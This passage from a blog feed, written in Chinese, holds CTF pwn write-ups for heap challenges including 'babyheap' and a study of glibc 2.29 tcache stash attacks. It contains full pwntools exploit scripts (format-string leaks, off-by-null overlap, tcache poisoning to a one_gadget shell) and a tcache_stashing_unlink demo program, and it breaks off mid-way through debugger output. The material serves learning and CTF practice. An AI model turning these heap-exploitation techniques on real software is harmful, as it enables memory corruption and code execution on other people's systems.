class="hljs-number">55804</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(data)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">':'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex&gt;'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'4'</span>)sla(<span class="hljs-string">'name'</span>,<span class="hljs-string">'%p%p'</span>)sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'1'</span>)ru(<span class="hljs-string">'0x'</span>)stackbase = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)info_addr(<span class="hljs-string">'stackbase'</span>,stackbase)ru(<span class="hljs-string">'0x'</span>)libcbase = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x3c6780</span>info_addr(<span class="hljs-string">'libcbase'</span>,libcbase)one = libcbase + <span class="hljs-number">0x45226</span>add(p64(<span class="hljs-number">0</span>) + p64(one)*<span class="hljs-number">6</span>)add(p64(<span class="hljs-number">0</span>) + p64(one)*<span class="hljs-number">6</span>)free(<span class="hljs-number">0</span>)free(<span class="hljs-number">1</span>)show()<span class="hljs-comment"># debug()</span>ru(<span class="hljs-string">'2:'</span>)heap = uu64(r(<span class="hljs-number">6</span>))info_addr(<span class="hljs-string">'heap'</span>,heap)sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'666'</span>)payload = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(heap+<span class="hljs-number">0x90</span>)sa(<span class="hljs-string">':'</span>,str(payload))itr()</code></pre></div><h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><h3 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h3><ul><li>off by null</li><li>show free 函数存在负溢，idx没做检查</li></ul><h3 id="小难点"><a href="#小难点" class="headerlink" title="小难点"></a>小难点</h3><p><strong>prev size 无法被修改到。</strong></p><p>解决办法：</p><p>用unlink机制来解决问题，其在更新进入unsortbin堆块的next chunk 的prev size时，会写入刚刚unsortbin堆块的size，并且在每次分割unsortbin后，每个堆块的原本写入的prev size，并不会清除。</p><p>这就变相的实现了prev size的修改，利用这个残余数据完成攻击。</p><h4 id="Poc-（不考虑tcache的影响）"><a href="#Poc-（不考虑tcache的影响）" class="headerlink" title="Poc （不考虑tcache的影响）"></a>Poc （不考虑tcache的影响）</h4><div class="hljs"><pre><code class="hljs python">add() <span class="hljs-comment">#1</span>add() <span class="hljs-comment">#2</span>add() <span class="hljs-comment">#3</span>free(<span class="hljs-number">1</span>)free(<span class="hljs-number">2</span>)<span class="hljs-comment">#已经实现在chunk 3的prev size 写入了 0x200</span>free(<span class="hljs-number">3</span>)add() <span class="hljs-comment">#1</span>add() <span class="hljs-comment">#2</span>add() <span class="hljs-comment">#3</span><span class="hljs-comment"># 申请回来继续用</span>free(<span class="hljs-number">1</span>)edit(<span class="hljs-number">2</span>,<span class="hljs-number">0xf8</span> * <span class="hljs-string">'1'</span>) <span class="hljs-comment">#fake 2 free过</span>free(<span class="hljs-number">3</span>)<span class="hljs-comment">#已经完成了overlap</span></code></pre></div><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./babyheap'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27411</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,size,data)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'ize:'</span>,str(size))    sa(<span class="hljs-string">':'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))show(<span class="hljs-number">-14</span>)r()libcbase = uu64(r(<span class="hljs-number">6</span>))  - <span class="hljs-number">0x3ec760</span>info_addr(<span class="hljs-string">'libcbase'</span>,libcbase)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">11</span>):    add()<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    free(<span class="hljs-number">10</span>-i)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>):    free(i)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):   add()add()add()add()<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    free(i)free(<span class="hljs-number">8</span>)edit(<span class="hljs-number">9</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">'\x01'</span> * <span class="hljs-number">0xf0</span>)free(<span class="hljs-number">10</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):   add()add()add()free(<span class="hljs-number">9</span>)edit(<span class="hljs-number">10</span>,<span class="hljs-number">0x8</span>, p64(<span class="hljs-number">0x3ed8e8</span> + libcbase))add()add()edit(<span class="hljs-number">11</span>,<span class="hljs-number">0x8</span>,p64(rce18[<span class="hljs-number">1</span>] + libcbase))free(<span class="hljs-number">1</span>)itr()</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>glibc 2.29引入stash 机制后引起的相关漏洞学习</title>
    <link href="/2020/10/29/glibc%202.29%E5%BC%95%E5%85%A5stash%20%E6%9C%BA%E5%88%B6%E6%9C%BA%E5%88%B6%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <url>/2020/10/29/glibc%202.29%E5%BC%95%E5%85%A5stash%20%E6%9C%BA%E5%88%B6%E6%9C%BA%E5%88%B6%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="glibc-2-29引入stash-机制后引起的相关漏洞学习"><a href="#glibc-2-29引入stash-机制后引起的相关漏洞学习" class="headerlink" title="glibc 2.29引入stash 机制后引起的相关漏洞学习"></a>glibc 2.29引入stash 机制后引起的相关漏洞学习</h1><p>以下示例的libc源码均为libc2.31.</p><h2 id="fastbin的stash机制"><a href="#fastbin的stash机制" class="headerlink" title="fastbin的stash机制"></a>fastbin的stash机制</h2><p>这里分析一下对于fastbin的stash机制</p><div class="hljs"><pre><code class="hljs c"> <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb) &lt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(get_max_fast())) <span class="hljs-comment">//size在fastbin范围内</span>  &#123;    idx = fastbin_index(nb);    mfastbinptr *fb = &amp;fastbin(av, idx);    mchunkptr pp;    victim = *fb;     <span class="hljs-keyword">if</span> (victim != <span class="hljs-literal">NULL</span>) <span class="hljs-comment">//如果有chunk</span>    &#123;      <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)        *fb = victim-&gt;fd; <span class="hljs-comment">//取出头chunk</span>      <span class="hljs-keyword">else</span>        REMOVE_FB(fb, pp, victim);       <span class="hljs-keyword">if</span> (__glibc_likely(victim != <span class="hljs-literal">NULL</span>))       &#123;        <span class="hljs-keyword">size_t</span> victim_idx = fastbin_index(chunksize(victim));        <span class="hljs-keyword">if</span> (__builtin_expect(victim_idx != idx, <span class="hljs-number">0</span>)) <span class="hljs-comment">//对fastbin的size检查</span>          malloc_printerr(<span class="hljs-string">"malloc(): memory corruption (fast)"</span>);        check_remalloced_chunk(av, victim, nb);  <span class="hljs-comment">//if USE_TCACHE，且看到此fastbin链表下，存在相同大小的bins（也就是一条chain），进行Stash。过程：把剩下的bins放入Tcache中</span>        <span class="hljs-comment">/* While we're here, if we see other chunks of the same size, stash them in the tcache.  */</span>        <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx(nb);        <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) <span class="hljs-comment">//如果属于tcache管辖范围</span>        &#123;          mchunkptr tc_victim;           <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks.  */</span>          <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = *fb) != <span class="hljs-literal">NULL</span>) <span class="hljs-comment">//只要tcache没满，并且fastbin还有chunk</span>          &#123;            <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)  <span class="hljs-comment">//从fastbin中取出</span>              *fb = tc_victim-&gt;fd;            <span class="hljs-keyword">else</span>            &#123;              REMOVE_FB(fb, pp, tc_victim);              <span class="hljs-keyword">if</span> (__glibc_unlikely(tc_victim == <span class="hljs-literal">NULL</span>))                <span class="hljs-keyword">break</span>;            &#125;            tcache_put(tc_victim, tc_idx);<span class="hljs-comment">//放入tcache中</span>          &#125;        &#125;<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>        <span class="hljs-keyword">void</span> *p = chunk2mem(victim);        alloc_perturb(p, bytes);        <span class="hljs-keyword">return</span> p;      &#125;    &#125;  &#125;</code></pre></div><p>也就是比如当一个线程申请0x50大小的chunk时，如果tcache没有，那么就会进入分配区进行处理，如果对应bin中存在0x50的chunk，除了取出并返回之外，ptmalloc会认为这个线程在将来还需要相同的大小的chunk，因此就会把对应bin中0x50的chunk尽可能的放入tcache的对应链表中去。</p><h3 id="Tcache-Stashing-遇上-fastbin-double-free"><a href="#Tcache-Stashing-遇上-fastbin-double-free" class="headerlink" title="Tcache Stashing  遇上 fastbin double free"></a>Tcache Stashing  遇上 fastbin double free</h3><p>假设有个double free可以触发，其用到fastbin上：<br>进行free 多次构成：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/G59EQi.png" srcset="/img/loading.gif" alt="1"></p><p>为了触发stash，先申请完tcache里的chunk，让其为空，（或者让其不满也可以）</p><p>然后再申请一下同size的chunk，就会触发stash。也是其精妙之处，在glibc2.27以下，往往是这样的构造：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/S4rab1.png" srcset="/img/loading.gif" alt="2"></p><p>主要由于fastbin 取出时，其会检查size是否相符合，导致很受限制。此时其基本就是可以攻击带有0x7f,去攻击libc上的内存。</p><p>但是有了stash这个机制，其就变成了以下的情况：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/68p4Vb.png" srcset="/img/loading.gif" alt="3"></p><p>由于上来申请同size的chunk时触发了stash机制，其会把fastbin里剩下的chunk放入到tcache中。由于chunk 7的fd是可以控制的，写入tag地址，然后放入chain的chunk ，也就是chunk 8 、7 、tag 。这就相当于劫持了tcache chain，可以实现任意地址写。</p><h3 id="相关例题"><a href="#相关例题" class="headerlink" title="相关例题"></a>相关例题</h3><ul><li>bytectf2020 gun</li><li>太湖杯 seven hero （libc2.29）</li></ul><h2 id="smallbin的stash机制"><a href="#smallbin的stash机制" class="headerlink" title="smallbin的stash机制"></a>smallbin的stash机制</h2><p>对于smallbin的stash机制：</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (in_smallbin_range (nb))&#123;  idx = smallbin_index (nb);  bin = bin_at (av, idx); <span class="hljs-comment">//smallbin 从chain尾开始取到的chunk的fd位位 bin值 （根据 FIFO，即为最先放入的 Chunk）</span>  <span class="hljs-keyword">if</span> ((victim = last (bin)) != bin) <span class="hljs-comment">//victim 即为刚刚取到的chunk</span>&#123;  bck = victim-&gt;bk; <span class="hljs-comment">//获取倒数第二个chunk  </span>  <span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)) <span class="hljs-comment">//验证双向链表是否正常</span>malloc_printerr (<span class="hljs-string">"malloc(): smallbin double linked list corrupted"</span>);  set_inuse_bit_at_offset (victim, nb);  bin-&gt;bk = bck;  bck-&gt;fd = bin;  <span class="hljs-comment">//将 bin 的 bk 指向 victim 的后一个 Chunk，将 victim 后一个 Chunk 的 fd 指向 bin，即将 victim 取出</span>  <span class="hljs-keyword">if</span> (av != &amp;main_arena)set_non_main_arena (victim);  check_malloced_chunk (av, victim, nb);<span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span>  <span class="hljs-comment">/* While we're here, if we see other chunks of the same size, stash them in the tcache.  */</span>  <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (nb); <span class="hljs-comment">//获取对应size的tcache索引</span>  <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)&#123;  mchunkptr tc_victim;  <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks over.  */</span>  <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last (bin)) != bin)   <span class="hljs-comment">//#define last(b)      ((b)-&gt;bk)  也就是 tc_victim = bin-&gt;bk</span>&#123;  <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)&#123;  bck = tc_victim-&gt;bk;  set_inuse_bit_at_offset (tc_victim, nb);  <span class="hljs-keyword">if</span> (av != &amp;main_arena)set_non_main_arena (tc_victim);  bin-&gt;bk = bck;  bck-&gt;fd = bin;  <span class="hljs-comment">//将 bin 的 bk 指向 tc_victim 的后一个 Chunk，将 tc_victim 后一个 Chunk 的 fd 指向 bin，即将 tc_victim 取出</span>  tcache_put (tc_victim, tc_idx);&#125;&#125;&#125;<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>  <span class="hljs-keyword">void</span> *p = chunk2mem (victim);  alloc_perturb (p, bytes);  <span class="hljs-keyword">return</span> p;&#125;&#125;</code></pre></div><p>也就是在smallbin分配之后，如果smallbin链表中仍然存在堆块，并且对应的tcache list没有满chain的话，就会将small bin链表中所有的堆块放入到相应的tcache中。</p><p><strong>当然要发生这种分配的方式，必须要越过tcache优先分配堆块，calloc的分配是不从tcache bin里取chunk的，即可满足。</strong></p><p>下面跟着示例代码和glibc相关源码调试来学习一下：</p><h3 id="tcache-stashing-unlink"><a href="#tcache-stashing-unlink" class="headerlink" title="tcache_stashing_unlink"></a><code>tcache_stashing_unlink</code></h3><h4 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;inttypes.h&gt;</span></span><span class="hljs-keyword">static</span> <span class="hljs-keyword">uint64_t</span> victim = <span class="hljs-number">0</span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span>&#123;setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0</span>);<span class="hljs-keyword">char</span> *t1;<span class="hljs-keyword">char</span> *s1, *s2, *pad;<span class="hljs-keyword">char</span> *tmp;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"You can use this technique to write a big number to arbitrary address instead of unsortedbin attack\n"</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n1. need to know heap address and the victim address that you need to attack\n"</span>);tmp = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"victim's address: %p, victim's vaule: 0x%lx\n"</span>, &amp;victim, victim);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"heap address: %p\n"</span>, tmp<span class="hljs-number">-0x260</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n2. choose a stable size and free six identical size chunks to tcache_entry list\n"</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Here, I choose the size 0x60\n"</span>);<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">6</span>; i++)&#123;t1 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>);<span class="hljs-built_in">free</span>(t1);&#125;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n"</span>, t1, t1<span class="hljs-number">-0x60</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">2</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">3</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">4</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">5</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n3. free two chunk with the same size like tcache_entry into the corresponding smallbin\n"</span>);<span class="hljs-comment">/* 将两个大小相同的块（如tcache_entry）释放到相应的smallbin中 */</span>s1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a chunk %p, whose size is beyond tcache size threshold\n"</span>, s1);pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a padding chunk, avoid %p to merge to top chunk\n"</span>, s1);<span class="hljs-built_in">free</span>(s1);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Free chunk %p to unsortedbin\n"</span>, s1);<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x3c0</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n"</span>);<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\n"</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"chunk %p is in smallbin[4], whose size is 0x60\n"</span>, s1+<span class="hljs-number">0x3c0</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Repeat the above steps, and free another chunk into corresponding smallbin\n"</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n"</span>);s2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<span class="hljs-built_in">free</span>(s2);<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x3c0</span>);<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"chunk %p is in smallbin[4], whose size is 0x60\n"</span>, s2+<span class="hljs-number">0x3c0</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"smallbin[4] list is %p &lt;--&gt; %p\n"</span>, s2+<span class="hljs-number">0x3c0</span>, s1+<span class="hljs-number">0x3c0</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n4. overwrite the first chunk in smallbin[4]'s bk pointer to &amp;victim-0x10 address, the first chunk is smallbin[4]-&gt;fd\n"</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Change %p's bk pointer to &amp;victim-0x10 address: 0x%lx\n"</span>, s2+<span class="hljs-number">0x3c0</span>, (<span class="hljs-keyword">uint64_t</span>)(&amp;victim)<span class="hljs-number">-0x10</span>);*(<span class="hljs-keyword">uint64_t</span>*)((s2+<span class="hljs-number">0x3c0</span>)+<span class="hljs-number">0x18</span>) = (<span class="hljs-keyword">uint64_t</span>)(&amp;victim)<span class="hljs-number">-0x10</span>;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n5. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\n"</span>);<span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Finally, the victim's value is changed to a big number\n"</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Now, victim's value: 0x%lx\n"</span>, victim);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><h4 id="编译命令"><a href="#编译命令" class="headerlink" title="编译命令"></a>编译命令</h4><div class="hljs"><pre><code class="hljs c">gcc  -g ./tcache_stashing_unlink.c -o tcache_stashing_unlink</code></pre></div><p>-g 编译是可以让gdb显示源码</p><h4 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">6</span>; i++)&#123;t1 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>);<span class="hljs-built_in">free</span>(t1);&#125;</code></pre></div><div class="hljs"><pre><code class="hljs undefined">(0x60)   tcache_entry[<span class="hljs-string">4</span>](<span class="hljs-link">6</span>): 0x5555555594a0 --&gt; 0x555555559440 --&gt; 0x5555555593e0 --&gt; 0x555555559380 --&gt; 0x555555559320 --&gt; 0x5555555592c0</code></pre></div><p>先往tcache 中0x60的bin chain 上放入6个bin.。</p><p>接着将两个大小相同的块（如<code>tcache_entry</code>）释放到相应的smallbin中。</p><div class="hljs"><pre><code class="hljs c">s1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a chunk %p, whose size is beyond tcache size threshold\n"</span>, s1);pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a padding chunk, avoid %p to merge to top chunk\n"</span>, s1);<span class="hljs-built_in">free</span>(s1);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Free chunk %p to unsortedbin\n"</span>, s1);</code></pre></div><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; heapinfo(<span class="hljs-number">0x20</span>)     fastbin[<span class="hljs-number">0</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x30</span>)     fastbin[<span class="hljs-number">1</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x40</span>)     fastbin[<span class="hljs-number">2</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x50</span>)     fastbin[<span class="hljs-number">3</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x60</span>)     fastbin[<span class="hljs-number">4</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x70</span>)     fastbin[<span class="hljs-number">5</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x80</span>)     fastbin[<span class="hljs-number">6</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x90</span>)     fastbin[<span class="hljs-number">7</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0xa0</span>)     fastbin[<span class="hljs-number">8</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0xb0</span>)     fastbin[<span class="hljs-number">9</span>]: <span class="hljs-number">0x0</span>                  top: <span class="hljs-number">0x555555559950</span> (size : <span class="hljs-number">0x206b0</span>)        last_remainder: <span class="hljs-number">0x0</span> (size : <span class="hljs-number">0x0</span>)             unsortbin: <span class="hljs-number">0x5555555594f0</span> (size : <span class="hljs-number">0x430</span>)</code></pre></div><div class="hljs"><pre><code class="hljs c"><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x3c0</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n"</span>);<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);</code></pre></div><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; heapinfo(<span class="hljs-number">0x20</span>)     fastbin[<span class="hljs-number">0</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x30</span>)     fastbin[<span class="hljs-number">1</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x40</span>)     fastbin[<span class="hljs-number">2</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x50</span>)     fastbin[<span class="hljs-number">3</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x60</span>)     fastbin[<span class="hljs-number">4</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x70</span>)     fastbin[<span class="hljs-number">5</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x80</span>)     fastbin[<span class="hljs-number">6</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x90</span>)     fastbin[<span class="hljs-number">7</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0xa0</span>)     fastbin[<span class="hljs-number">8</span>]: <span class="hljs-number">0x0</span>(<span 